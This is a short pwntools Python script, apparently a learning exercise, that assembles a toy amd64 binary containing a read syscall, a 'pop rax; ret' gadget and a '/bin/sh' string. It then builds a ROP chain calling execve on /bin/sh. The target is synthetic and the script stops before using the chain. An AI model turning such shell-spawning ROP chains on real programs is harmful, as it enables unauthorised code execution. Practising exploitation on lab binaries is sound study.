from pwn import *

context.clear(arch='amd64')

c = constants
assembly = 'read:' + shellcraft.read(c.STDIN_FILENO, 'rsp', 1024)
assembly += 'ret\n'
assembly += 'pop rax; ret\n'
assembly += 'syscall\n'
assembly += 'binsh: .asciz "/bin/sh"'
binary = ELF.from_assembly(assembly)



context.kernel = 'amd64'
rop = ROP(binary)
binsh = binary.symbols[b'binsh']
rop.execve(binsh, 0, 0)





#elf=ELF('mainTest.e')



#rop=ROP(elf)


